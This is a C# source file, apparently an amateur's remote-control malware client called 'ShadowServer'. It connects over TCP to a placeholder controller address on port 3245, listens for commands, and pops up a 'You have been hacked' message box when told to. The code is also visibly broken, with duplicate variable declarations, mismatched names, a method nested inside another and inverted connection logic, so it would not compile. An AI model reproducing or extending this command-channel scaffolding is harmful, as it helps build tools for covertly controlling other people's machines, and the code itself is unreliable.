using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;
using System.Windows.Forms;



namespace ShadowServer
{
    class program

    {

        public static TcpClient client;
        public static int port = 3245;
        public static string connectTo = "ipaddress"; //Need to figure out how can i automate this with a GUI
        public static IPAddress ipaddress = null;
        public static Thread getMessages = new Thread(readMessage);
        public static NetworkStream datastream;
        static int getIndex(byte[] buffer)
        {
            int i = 0;
            for (int i = 0; i < buffer.Length; i++)
            {


                if (buffer[i] == 0x00) { break; }

            }
            return i;



        }
        static void analyzeMessage(string msg)
        {
            if (msg == "Display Message")
            {
                MessageBox.Show("You have been hacked", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }
        static void readMessage()
        {
            string temp = "";
            while (true)
            {
                if (datastream.DataAvailable == true)
                {
                    byte[] buffer = new byte[1048];
                    datastream.Read(buffer, 0, buffer.Length);
                    int cutAT = getIndex(buffer);
                    for (int i = 0; i < cutAt; i++)
                    {

                        if (buffer[i] == 0x00) { }

                    }

                    for (int i = 0; i < buffer.Length; i++)
                    {
                        temp += (char)buffer[i];
                    }
                    analyzeMessage(temp);
                    temp = string.Empty;
                    datastream.Flush();


                }
            }
            static void Main(string[] args)
            {
                bool isValidIp = IPAddress.TryParse(connectTo, out ipaddress);

                if (isValidIp == false)
                {
                    ipaddress = Dns.GetHostAddresses(connectTo)[0]; Console.WriteLine(Dns.GetHostAddresses(connectTo)[0]);

                    client = new TcpClient();
                    try
                    {
                        do
                        {
                            client.Connect(ipaddress, port);
                            datastream = client.GetStream();
                            getMessages.Start();

                        } while (client.Connected != true);
                    }
                    catch (Exception ex) { }
                }
            }
        }
    }
}

    
